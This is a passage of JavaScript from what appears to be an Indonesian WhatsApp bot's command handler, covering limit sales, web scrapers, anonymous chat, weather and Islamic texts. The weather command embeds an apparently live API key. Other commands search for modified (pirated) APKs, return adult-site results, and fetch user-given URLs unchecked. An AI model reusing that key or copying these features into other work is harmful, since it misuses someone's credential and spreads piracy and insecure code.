  • 30 Limited ( 6k )
  • 40 Limited ( 10k )
  • 50 limited ( 13k )
  • 60 limited ( 16k )
  • 100 limited ( 20k )
  
  Example : .buylimit20
`)
}
break
case 'buylimit20': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`3Rb Silahkan Ketik .pembayaran`)
}
break
case 'buylimit30': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`6Rb Silahkan Ketik .pembayaran`)
}
break
case 'buylimit40': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`10Rb Silahkan Ketik .pembayaran`)
}
break
case 'buylimit50': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`13kRb Silahkan Ketik .pembayaran`)
}
break
case 'buylimit60': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`16kRb Silahkan Ketik .pembayaran`)
}
break
case 'buylimit100': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`20Rb Silahkan Ketik .pembayaran`)
}
break
case 'buylimitinfinty': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`30Rb Silahkan Ketik .pembayaran`)
}
break
 /* 

Credits: zaenishi
Jenis fitur: mencari tokoh terkenal maupun legenda

*/
case 'siapakah':
case 'sk': {
if (banned.includes(m.sender)) {
    return;
    }
  async function siapakah(query) {
    let response = await axios.get(`https://www.google.com/search?q=Siapakah ${query}&hl=id`)

    let $ = cheerio.load(response.data)
    let result = {
      result: []
    }
    let content = $('div[class="BNeawe tAd8D AP7Wnd"]').text()
    
    result.result.push(
      content
        .replace('tampilkan semua', '')
        .replace('Tampilkan Semua', '')
        .replace('Tampilkan semua', '')
        .replace('tampilkan Semua', '')
        .replace('TAMPILKAN SEMUA', '')
        .replace(/[0-9]/g, '') 
    )
    
    return result
  }
  if (!text) return reply(`*Format Seperti Ini:* ${command} jokowi\n\nFitur Masih Dalam Pengembangan`)
  siapakah(text).then(response => {
    if (response.result[0].length < 1) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('tidak cocok')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('yang lain')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('maps')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('map')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('...')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (/[^\x00-\x7F]/.test(response.result[0])) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (/(?:\.\.\.|[\u2026])/.test(response.result[0])) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].length > 300) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    reply(response.result[0])
  })
}
break
 /* 

Credits: zaenishi
Jenis fitur: random foto anime hd

*/

case 'kcrandom': case 'kcimg': {
if (banned.includes(m.sender)) {
    return;
    }
async function animeRandom() {
    try {
        let response = await axios.get('https://konachan.net/post?tags=order%3Arandom');
        let $ = cheerio.load(response.data);
        let hasil = {
            status: 200,
            creator: 'zaenishi',
            imageUrl: []
        };
        $('#post-list-posts a.directlink.largeimg').each((index, element) => {
            hasil.imageUrl.push( $(element).attr('href') );
        });
        return hasil;
    } catch (error) {
        console.error('Error:', error);
return error
    }
}

react('🕐', m.chat, m.key)
try {
let response = await animeRandom()
let random = pickRandom(response.imageUrl)

KhaerulZx.sendMessage(m.chat, { image: { url: random }, caption: 'Random Image Anime\n\n*Powered By konachan.net*' }, { quoted: m })
} catch (e) {
reply(e)
}
}
break
 /* 

Credits: zaenishi
Jenis fitur: mencari mod apk

*/
 case 'modapk': {
if (banned.includes(m.sender)) {
    return;
    }
  const axios = require('axios')
  const cheerio = require('cheerio')

  async function mods(apk) {
    const url = `https://m.happymod.com/search.html?q=${apk}`

    const response = await axios.get(url)
    const html = response.data
    const $ = cheerio.load(html)

    const apps = []

    $('.app-info-list .s-app-block').each((index, element) => {
      const app = {
        creator: 'zaenishi',
        status: 200,
        title: $(element).find('.info-wrap .nowrap a').text().trim(),
        image: $(element).find('.img img').attr('data-src'),
        downloadUrl: `https://m.happymod.com${$(element).find('.down a').attr('href')}`
      }
      apps.push(app)
      if (apps.length >= 5) return false
    })

    return apps
  }

  if (text) {
    const response = await mods(text)
    let result = ''

    response.forEach((app, index) => {
      result += `*${index + 1}*. ${app.title}:\n`
      result += `∘ Download ${app.downloadUrl}\n\n`
    })

    KhaerulZx.sendMessage(m.chat, {
      text: result,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: false,
          title: `M O D S  S E A R C H`,
          body: `Looking for Cool and Free Apk Mods!`,
          sourceUrl: 'https://m.happymod.com',
          thumbnailUrl: thurl,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    })
  } else {
    reply(`Masukan Text, *Seperti Format Ini*: .${command} minecraft`)
  }
}
break
 /* 

Credits: zaenishi
Jenis fitur: mencari berita tentang islam di dunia, lengkap, dan terbaru

*/

case 'islamnews': case 'islamn': {
if (banned.includes(m.sender)) {
    return;
    }
const axios = require('axios')
const cheerio = require('cheerio')

async function islamNews() {
        try {
            const response = await axios.get('https://www.cnbcindonesia.com/tag/islam')
            const $ = cheerio.load(response.data) 
            let result = []

            $('li').each((index, element) => {
                const link = $(element).find('a').attr('href')
                const imgSrc = $(element).find('.ratiobox_content.lqd img').attr('src')
                const titleElement = $(element).find('h2')
                const dateElement = $(element).find('.date')

                if (titleElement.length > 0 && dateElement.length > 0) {
                    const title = titleElement.text().trim()
                    const date = dateElement.text().trim()

                    result.push({
                        creator: 'zaenishi',
                        status: 200,
                        link: link,
                        img: imgSrc,
                        title: title,
                        date: date
                    })
                }
            })

            return result
        } catch (error) {
            console.error('Error fetching data:', error.message)
            throw error
        }
    }

if (!text) {
islamNews().then(result => {
        if (result.length > 0) {
            let islamText = ''
            result.forEach((news, index) => {
                islamText += `*${index + 1}. ${news.title}* ${news.date}\n\n∘ ${news.link}\n\n`
            })
            reply(islamText + `*Untuk Mendapatkan Info Selanjutnya Silahkan Ketik .${command} <url>*`)
        } else {
            reply('No data found.')
        }
    }).catch(error => {
        console.error('Error:', error.message)
        reply('An error occurred while fetching data. Please try again later.')
    })
} else {
async function islamData(url) {
const cheerio = require('cheerio')
let zaenishi = await axios.get(url)
let $ = cheerio.load(zaenishi.data)
let result = []
let title = $('.jdl'). find('.container').find('h1').text()
let desk = $('.detail_text').find('p').text()
result.push({

title: title,
desk: desk
})
return result
}
islamData(text).then(respon => {
let islamText = `*${respon[0].title}*\n\n${respon[0].desk}`
reply(islamText)
})
}
}
break
 /* 

Credits: zaenishi
Jenis fitur: mencari kata kata/quotes dari goodreads berdasarkan nama tokoh

*/
case 'quotess':
case 'goodreads': {
if (banned.includes(m.sender)) {
    return;
    }
  async function quotess(nama) {
    const cheerio = require('cheerio')
    let zaenishi = await axios.get(`https://www.goodreads.com/quotes/search?q=${nama}`)
    let $ = cheerio.load(zaenishi.data)
    let hasil = []

    $('.quoteText').each((index, element) => {
      let selectedQuote = $(element).clone()
        .children()
        .remove()
        .end()
        .text()
        .replace(/\s+/g, ' ')
        .replace(/―/g, '')
        .trim()

      let selectedAuthor = $(element).find('.authorOrTitle').text().trim()
      let formattedAuthor = selectedAuthor.replace(/\s+/g, ' ').trim()

      hasil.push({
        creator: 'zaenishi',
        status: 200,
        quotes: selectedQuote,
        author: formattedAuthor
      })
    })

    return hasil
  }

  if (!text) return reply(`*Quotes Siapa?* .${command} <nama>`)

  quotess(text).then(respon => {
    if (respon.length > 0) {
      const randomIndex = Math.floor(Math.random() * respon.length)
      const formattedResult = `${respon[randomIndex].quotes}\n\n*- ${respon[randomIndex].author}*`
      reply(formattedResult)
    } else {
      reply(`Quotes Tidak Ditemukan`)
    }
  })
  }
  break
 /* 

Credits: zaenishi
Jenis fitur: mencari kuliner di kota anda, berdasarkan kota bahkan ras

*/

case 'rekomendasi_game':
    case 'gamepop': {
    if (banned.includes(m.sender)) {
    return;
    }
    const cheerio = require('cheerio')
    
    async function meme() {
  try {
    const response = await axios.get('https://carisinyal.com/category/games/')
    const $ = cheerio.load(response.data)

    const recommendations = []

    $('.oxy-post-wrap').each((index, element) => {
      const title = $(element).find('.oxy-post-title').text().trim()
      const url = $(element).find('.oxy-post-title').attr('href')

      recommendations.push({
        creator: 'zaenishi',
        status: 200,
        title,
        url
      })
    })

    return recommendations
  } catch (error) {
    console.error('Error fetching or parsing data:', error.message)
  }
}

async function meme1(url) {
  try {
    const response = await axios.get(url)
    const $ = cheerio.load(response.data)

    const asu = []

    $('.wp-block-heading').each((index, element) => {
      const name = $(element).text().trim()
      asu.push({
        creator: 'zaenishi',
        status: 200,
        name: `${name}`
      })
    })

    return asu
  } catch (error) {
    console.error('Error fetching or parsing data:', error.message)
  }
}

      if (!text) {
      try {
        const recommendations = await meme()
        const recommendationText = recommendations.map((rec, index) => `*${index + 1}.* ${rec.title} ${rec.url}`).join('\n\n')
        reply(`${recommendationText}\n\n*Salin URL dan ketik .${command} (URLnya)*`)
        } catch (e) {
        reply(`Mungkin Ada Masalah.`)
        }
      } else {
            try {
        const meme1Result = await meme1(text)
        const meme1Text = meme1Result.map((meme, index) => `${meme.name}`).join('\n')
        reply(meme1Text)
              } catch (e) {
        reply(`Url Tidak Tersedia, Atau terjadi Masalah`)
        }
        }
      }
      break /*
   creator: zaenishi
   team: jamurTeam
   contact: 6283188229366
*/

case 'otakudessearch':  case 'otaksearch': {
if (banned.includes(m.sender)) {
    return;
    }
const axios = require('axios');
const cheerio = require('cheerio');

async function anu(search) {
 const url = 'https://otakudesu.cloud/?s=' + search + '&post_type=anime';

 try {
   let response = await axios.get(url);
   const $ = cheerio.load(response.data);

   const results = [];

   $('ul.chivsrc li').each((index, element) => {
     const title = $(element).find('h2 a').text();
     const link = $(element).find('h2 a').attr('href');
     const image = $(element).find('img').attr('src');
     const genres = [];

     $(element).find('.set a').each((i, el) => {
       genres.push($(el).text());
     });

     const status = $(element).find('.set:contains("Status")').text().replace('Status : ', '');
     const rating = $(element).find('.set:contains("Rating")').text().replace('Rating : ', '');

     results.push({ title, link, image, genres, status, rating });
   });

   return results;
 } catch (error) {
   console.error("Error fetching data:", error);
 }
}

async function ah(search) {
  let ngent = '';
  try {
    let response = await anu(search);
    let genre = [];
    response[0].genres.forEach((element, index) => {
      genre.push(`(${element})`);
    });
    ngent = `*👀 ANIME SEARCH*

\`nama:\` ${response[0].title}
\`link:\` ${response[0].link}
\`image:\` ${response[0].image}
\`genres:\` ${genre.join(', ')}
\`status:\` ${response[0].status}
\`rating:\` ${response[0].rating}`;
  } catch (error) {
    console.error(error);
  }
  return ngent;
}

if (!text) return reply('Penggunaan: .otakudesSearch shinigami')
ah(text).then(response => {
reply(response)
})
}
break
 /*
   creator: zaenishi
   team: jamurTeam
   contact: 6283188229366
*/

case 'otakudesdetails': case 'detailsanime': case 'animedetail': {
if (banned.includes(m.sender)) {
    return;
    }
async function otakudesDetails(link) {
    try {
        const zaenishi = await axios.get(link);
        const $ = cheerio.load(zaenishi.data);
        const hasil = [];

        const judul = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Judul')).parent().text().trim().split(': ')[1];
        const skor = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Skor')).parent().text().trim().split(': ')[1];
        const produser = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Produser')).parent().text().trim().split(': ')[1];
        const tipe = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Tipe')).parent().text().trim().split(': ')[1];
        const status = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Status')).parent().text().trim().split(': ')[1];
        const studio = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Studio')).parent().text().trim().split(': ')[1];
        const rilis = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Tanggal Rilis')).parent().text().trim().split(': ')[1];
        const episode = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Total Episode')).parent().text().trim().split(': ')[1];
        let sinopsis = '';
        $('.sinopc p').each((index, element) => {
            sinopsis += $(element).text().trim() + '\n';
        });
        const genreArray = [];
        $('div.infozingle span b').filter((index, element) => $(element).text().includes('Genre')).siblings('a').each((index, element) => {
            genreArray.push($(element).text().trim());
        });
        const genre = genreArray.join(', ');

        hasil.push({
            judul: judul,
            skor: skor,
            produser: produser,
            tipe: tipe,
            status: status,
            studio: studio,
            rilis: rilis,
            episode: episode,
            genre: genre,
            sinopsis: sinopsis.trim()
        });

        return hasil;
    } catch (error) {
        console.error('Error:', error);
        return [];
    }
}

if (!text) return reply(`Ikuti contoh penggunaan ini: .${command} https://otakudesu.cloud....`)
let response = await otakudesDetails(text)
if (response.length === 0) return reply(`Gagal Mendapatkan Respon Api.`)
reply(`*📰 Anime Details OtakudesuDetails*
Judul: ${response[0].judul}
Skor: ${response[0].skor}
Produser: ${response[0].produser}
Tipe: ${response[0].tipe}
Status: ${response[0].status}
Studio: ${response[0].studio}
Rilis: ${response[0].rilis}
Episode: ${response[0].episode}
Genre: ${response[0].genre}

*📖 Sinopsis:*\n\n${response[0].sinopsis}`)
}
break
case 'xnxxsearch': {
if (banned.includes(m.sender)) {
    return;
    }
	if (!isPrem) return reply(mess.premium)
	if (!text) return reply(`Enter Query`)
	reply(mess.wait)
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) reply(ff)
              }
              break
              case 'sendprofile': case 'sendprofil':
              if (banned.includes(m.sender)) {
    return;
    }
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
reply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await KhaerulZx.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
return false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var rees = await KhaerulZx.sendContact(partnerJID, [m.sender.split("@")[0]])
KhaerulZx.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
KhaerulZx.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: rees })
}
break
//=========================================\\======
case 'anonymouschat': {
if (banned.includes(m.sender)) {
    return;
    }
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
reply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
break
//=========================================\\======
case 'mulai-anonymus': case 'start-anonymus': {
if (banned.includes(m.sender)) {
    return;
    }
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
KhaerulZx.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next-anonymus': case 'lanjut-anonymus': {
if (banned.includes(m.sender)) {
    return;
    }
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
return false
}
let other = romeo.other(m.sender)
if (other) await KhaerulZx.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
KhaerulZx.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
}
break
//=========================================\\======
case 'quotesanime':
case 'quotesanim': {
if (banned.includes(m.sender)) {
    return;
    }
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}
break
 case 'quotesbacot': {
 if (banned.includes(m.sender)) {
    return;
    }
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}
break
 case 'fliptext': {
 if (banned.includes(m.sender)) {
    return;
    }
if (args.length < 1) return reply(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
 case 'kisahnabi': {
 if (banned.includes(m.sender)) {
    return;
    }
     if (!text) return reply(`Masukan nama nabi\nExample: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     reply(`${hasil}`)

}
break
case 'cuaca':
case 'weather':{
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           KhaerulZx.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'ayatkursi': {
           if (banned.includes(m.sender)) {
    return;
    }
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  reply(caption)
}
break
//=========================================\\
case 'bacaansholat': {
if (banned.includes(m.sender)) {
    return;
    }
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
